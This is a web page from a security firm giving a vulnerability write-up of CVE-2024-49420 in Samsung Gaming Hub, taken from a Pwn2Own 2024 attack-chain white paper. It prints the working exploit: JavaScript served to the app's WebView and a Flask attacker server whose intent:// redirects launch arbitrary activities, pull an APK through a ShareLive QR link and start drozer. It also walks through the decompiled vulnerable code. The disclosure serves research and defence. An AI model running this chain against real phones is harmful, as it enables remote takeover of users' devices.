<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Samsung GamingHub Arbitrary Launch Activity - CVE-2024-49420 | Malicious Erection LLC</title>
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="Samsung GamingHub Arbitrary Launch Activity - CVE-2024-49420" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Improper handling of responses in GamingHub prior to version 6.1.04.6 in Korea, 7.1.03.7 in Global allows remote attackers to launch arbitrary activity." />
<meta property="og:description" content="Improper handling of responses in GamingHub prior to version 6.1.04.6 in Korea, 7.1.03.7 in Global allows remote attackers to launch arbitrary activity." />
<link rel="canonical" href="https://maliciouserection.com/cves/2024-12-01_cve-2024-49420/" />
<meta property="og:url" content="https://maliciouserection.com/cves/2024-12-01_cve-2024-49420/" />
<meta property="og:site_name" content="Malicious Erection LLC" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-12-01T00:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Samsung GamingHub Arbitrary Launch Activity - CVE-2024-49420" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-12-01T00:00:00+00:00","datePublished":"2024-12-01T00:00:00+00:00","description":"Improper handling of responses in GamingHub prior to version 6.1.04.6 in Korea, 7.1.03.7 in Global allows remote attackers to launch arbitrary activity.","headline":"Samsung GamingHub Arbitrary Launch Activity - CVE-2024-49420","mainEntityOfPage":{"@type":"WebPage","@id":"https://maliciouserection.com/cves/2024-12-01_cve-2024-49420/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"https://maliciouserection.com/assets/images/logo.png"}},"url":"https://maliciouserection.com/cves/2024-12-01_cve-2024-49420/"}</script>
<!-- End Jekyll SEO tag -->

    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Work+Sans&display=swap"
      rel="stylesheet"
    />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"
    />
    <link rel="stylesheet" href="/assets/css/main.css" />
  </head>

  <body class="flex flex-col h-screen antialiased">
    <div 
  class="flex-none bg-base-100 shadow-sm h-20 navbar"
  style="height: 10rem;"
>
  <div 
    class="flex-none navbar-start"
    style="height: 9rem;"
  >
    <div class="shadow-lg dropdown">
      <div tabindex="0" role="button" class="lg:hidden btn btn-ghost">
        <svg
          xmlns="http://www.w3.org/2000/svg"
          class="w-5 h-5"
          fill="none"
          viewBox="0 0 24 24"
          stroke="currentColor"
        >
          <path
            stroke-linecap="round"
            stroke-linejoin="round"
            stroke-width="2"
            d="M4 6h16M4 12h8m-8 6h16"
          />
        </svg>
      </div>
      <ul
        tabindex="0"
        class="z-[1] space-y-5 bg-base-100 shadow mt-3 p-2 rounded-box w-72 menu menu-sm dropdown-content"
      >
        
        <li class="text-secondary text-lg">
          <a href="/">Home</a>
        </li>
        
        <li class="text-secondary text-lg">
          <a href="/blog">Blog</a>
        </li>
        
        <li class="text-secondary text-lg">
          <a href="/tools">Tools</a>
        </li>
        
        <li class="text-secondary text-lg">
          <a href="/vulnerability-disclosure-policy">Vulnerability Disclosure Policy</a>
        </li>
        
        <li class="text-secondary text-lg">
          <a href="/cves">CVEs</a>
        </li>
        
      </ul>
    </div>
    <a 
      href="/" 
      title="Malicious Erection LLC" 
      class="px-5"
      style="height: 7rem;"
    >
      <img
        src="/assets/images/logo.png"
        alt="Malicious Erection LLC"
        class="w-32 object-center image-center"
        style="width: 15rem;"
      />
    </a>
  </div>
  <div class="hidden lg:flex flex-1 gap-3 navbar-end">
    <ul class="gap-3 px-1 menu menu-horizontal">
      
      <li class="font-semibold text-base">
        <a href="/">Home</a>
      </li>
      
      <li class="font-semibold text-base">
        <a href="/blog">Blog</a>
      </li>
      
      <li class="font-semibold text-base">
        <a href="/tools">Tools</a>
      </li>
      
      <li class="font-semibold text-base">
        <a href="/vulnerability-disclosure-policy">Vulnerability Disclosure Policy</a>
      </li>
      
      <li class="font-semibold text-base">
        <a href="/cves">CVEs</a>
      </li>
      
    </ul>
  </div>
</div>

    <div class="flex-1 overflow-y-auto">
      <div class="min-h-[80vh]"><main>
  <!-- Header Section -->
  <section class="flex justify-center items-center bg-secondary/75 py-16">
    <h1 class="font-bold text-neutral-content text-5xl text-center">Samsung GamingHub Arbitrary Launch Activity - CVE-2024-49420</h1>
  </section>

  <!-- Content Section -->
  <section class="mx-auto py-10 text-neutral-content prose px-4 sm:px-6 lg:px-8 max-w-full lg:max-w-5xl xl:max-w-[1100px]">
    <p>The below snippet is taken from the full white paper, available here: <a href="/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html">https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html</a></p>

<p>I think you should read the white paper instead :)</p>

<hr />

<h4 id="exploit-payload">Exploit Payload</h4>

<p>Two payloads are used for this bug. The first payload is the HTML content that is hosted at the URL <code class="language-plaintext highlighter-rouge">https://us.mcsvc.samsung.com.maliciouserection.com?yayattackeryay=&lt;attackerServer&gt;</code>. Due to bugs 1 and 2, the Gaming Hub WebView will load and execute the below HTML code.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>yaytrampolineyay
&lt;script&gt;

// get hostname and port
var yayquerystringyay = window.location.search;
var yayurlparamsyay = new URLSearchParams(yayquerystringyay);
var yayattackeryay = yayurlparamsyay.get('yayattackeryay');

// open sharelive to start awareservice
location.href="http://" + yayattackeryay + "/yaylaunchshareliveyay";

// redirect after 2 seconds
const yayshorttimeoutyay = setTimeout(yaystartyay, 2000);

// open sharelive and retrieve file
function yaystartyay() {
        location.href="http://" + yayattackeryay + "/yayshareliveyay";
}

// redirect after 15 seconds
const yaytimeoutyay = setTimeout(yayfinalyay, 15000);

// redirect to launch easymover agent
function yayfinalyay() {
        location.href="http://" + yayattackeryay + "/yayfinalyay";

        // redirect after another 15 seconds
        const yaytimeout2yay = setTimeout(yaylaunchyay, 15000);
}

// launch drozer
function yaylaunchyay() {
        location.href="http://" + yayattackeryay + "/yaylaunchyay";
}

&lt;/script&gt;
</code></pre></div></div>

<p>The second payload is a Python script that is hosted at an attacker controlled server. There is no IP address or domain requirements for this web server, as long as the server can be reached via HTTP/S.</p>

<p>By running the below Python script, the attacker will run a Flask based web server:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from flask import Flask, redirect, url_for, send_from_directory

app = Flask(__name__)

# Route for serving index.html
@app.route('/')
def index():
    return send_from_directory('', 'index.html')

# redirect to open com.sec.android.easyMover.Agent
@app.route('/yayfinalyay')
def yayfinalyay():
    return redirect("intent://#Intent;component=com.sec.android.easyMover.Agent/.ui.SsmUpdateCheckActivity;action=com.sec.android.easyMover.Agent.WATCH_INSTALL_SMART_SWITCH;S.MODE=DIALOG;S.ssm_action=yayactionyay;S.ssm_uri=%63%6f%6e%74%65%6e%74%3a%2f%2f%63%6f%6d%2e%73%61%6d%73%75%6e%67%2e%67%70%75%77%61%74%63%68%61%70%70%2e%48%74%6d%6c%44%75%6d%70%50%72%6f%76%69%64%65%72%2f%79%61%79%2e%61%70%6b;end;", code=302)

# launch sharelive to stare aware service
@app.route('/yaylaunchshareliveyay')
def yaylaunchshareliveyay():
    return redirect("intent://#Intent;component=com.samsung.android.app.sharelive/.presentation.main.MainActivity;end;", code=302)

# sharelive to download yay.apk to arbitrary location
@app.route('/yayshareliveyay')
def yayshareliveyay():
    yayqrcodeyay = "88AKqZwy2Hmr"
    return redirect("intent://qr.quickshare.samsungcloud.com/" + yayqrcodeyay + "#Intent;component=com.samsung.android.app.sharelive/com.samsung.android.app.sharelive.presentation.applink.QrCodeAppLinkActivity;scheme=https;end;", code=302)

# launch drozer
@app.route('/yaylaunchyay')
def yaylaunchyay():
    return redirect("intent://#Intent;component=com.yaydevhackmodyay.drozer/com.mwr.dz.activities.MainActivity;end;", code=302)

# pichu dancing
@app.route('/pichu-dance.gif')
def pichuDance():
    return send_from_directory('', 'pichu-dance.gif')

if __name__ == '__main__':
    context = ('cert.pem', 'key.pem')
    app.run(debug=True, port=8000, host="0.0.0.0")
</code></pre></div></div>

<h4 id="exploit-details">Exploit Details</h4>

<p>Continuing to exploit the Gaming Hub application, the loaded WebView contains code that will execute different actions based on the type of data that is received from the loaded web server.</p>

<p>When the WebView receives a 302 Redirect code from the web server, the class <code class="language-plaintext highlighter-rouge">com.samsung.android.game.gamehome.gmp.ui.web.o</code> method <code class="language-plaintext highlighter-rouge">shouldOverrideUrlLoading(WebView, WebResourceRequest)</code> is executed. From there, the redirection URL is analyzed.</p>

<p>If the redirection URL has a scheme value of <code class="language-plaintext highlighter-rouge">intent://</code>, then the URL is passed to class <code class="language-plaintext highlighter-rouge">com.samsung.android.game.gamehome.gmp.ui.web.GmpWebActivity</code> method <code class="language-plaintext highlighter-rouge">f(Uri, int)</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class o extends WebViewClient {
    public final p a; // interface linked with GmpWebActivity
...
    public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
        boolean q;
        ...
        String yayschemeyay = request.getUrl().getScheme();
        Uri yayurlyay = request.getUrl();
        ...
        q = o.q("intent", yayschemeyay, true); // checks if first 2 objects match
        if (q) {
            this.a.f(url, a(yayurlyay)); // checks if the url authority value is either `instantplays` or `cloudgame`
            return true;
        }
</code></pre></div></div>

<p>Class <code class="language-plaintext highlighter-rouge">GmpWebActivity</code> method <code class="language-plaintext highlighter-rouge">f(Uri, int)</code> takes the incoming URL and passes it to Android’s internal Intent parser. The Intent parser is commonly used to craft Intent objects based on the incoming URI value. After the Intent object is created, <code class="language-plaintext highlighter-rouge">startActivity(Intent)</code> is executed against the Intent object.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class GmpWebActivity extends s implements n, p {
...
    public void f(Uri yayurlyay, int i) {
        Intent yayintentyay = Intent.parseUri(yayurlyay.toString(), 0);
        yayintentyay.addFlags(i);
        ...
        a.b(a, this, yayintentyay, false, 2, null);
    }
... 
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class a {
...
    public static boolean b(a a, Context context, Intent yayintentyay, boolean z, int i, Object obj) {
        ...
        return a.a(context, yayintentyay, z);
    }
    ...
    public final boolean a(Context context, Intent yayintentyay, boolean z) {
        ...
        try {
            context.startActivity(yayintentyay);
            return true;
        ...
    }
</code></pre></div></div>

<h4 id="bug-3--start-arbitrary-exported-activities">BUG 3 – Start Arbitrary Exported Activities</h4>

<p>If the web server sends a 302 Redirect HTTP code with a redirect URL starting with <code class="language-plaintext highlighter-rouge">intent://</code>, the WebView in Gaming Hub can be forced to start arbitrary activities.</p>

<p>In our exploit chain, the URL <code class="language-plaintext highlighter-rouge">https://us.mcsvc.samsung.com.maliciouserection.com?yayattackeryay=&lt;attackerServer&gt;</code> contains HTML code which runs JavaScript. This JavaScript forces the WebView to make a GET request to the attacker controlled server, defined by the GET parameter “<attackerServer>".</attackerServer></p>

<p>An attacker should run the previously mentioned Python script, which will host the web server at “<attackerServer>". This Python script simply returns a `302 Redirect HTTP` code, along with different URIs with `intent://` schemes.</attackerServer></p>

<p>For example, if a GET request is made to “http://<attackerServer>/yaylaunchshareliveyay", the Python script will return a 302 Redirect HTTP code with the following URI:</attackerServer></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>intent://#Intent;component=com.samsung.android.app.sharelive/.presentation.main.MainActivity;end;
</code></pre></div></div>

<p>When the Gaming Hub WebView receives this URI, it will:</p>

<ul>
  <li>Pass the URI to Android’s internal Intent parser</li>
  <li>Craft an Intent object based on the URI</li>
  <li>Run <code class="language-plaintext highlighter-rouge">startActivity(Intent)</code> against the Intent Object</li>
</ul>

<p>The rest of this exploit chain heavily relies on the ability to launch arbitrary exported Activities due to sending different 302 Redirect URIs.</p>

  </section>

  <!-- CTA Button (optional) -->
  
</main>
</div>
      <div class="bg-neutral-800">
  <footer class="mx-auto py-10 container">
    <div class="flex flex-wrap justify-center gap-3 mb-10 align-center">
      
      <a href="/" class="btn btn-secondary btn-ghost"
        >Home</a
      >
      
      <a href="/blog/" class="btn btn-secondary btn-ghost"
        >Blog</a
      >
      
      <a href="/tools" class="btn btn-secondary btn-ghost"
        >Tools</a
      >
      
      <a href="/vulnerability-disclosure-policy" class="btn btn-secondary btn-ghost"
        >Vulnerability Disclosure Policy</a
      >
      
      <a href="/cves/" class="btn btn-secondary btn-ghost"
        >CVEs</a
      >
      
    </div>
    <div class="flex justify-center items-center gap-3 mb-10">
      
      <a
        title="Github"
        href="https://github.com/MaliciousErection"
        class="btn btn-ghost btn-circle"
      >
        <i class="fa fa-github text-xl"></i>
      </a>
      
    </div>
    <p class="text-center">© 2025 Malicious Erection LLC.</p>
  </footer>
</div>

    </div>
  </body>
</html>
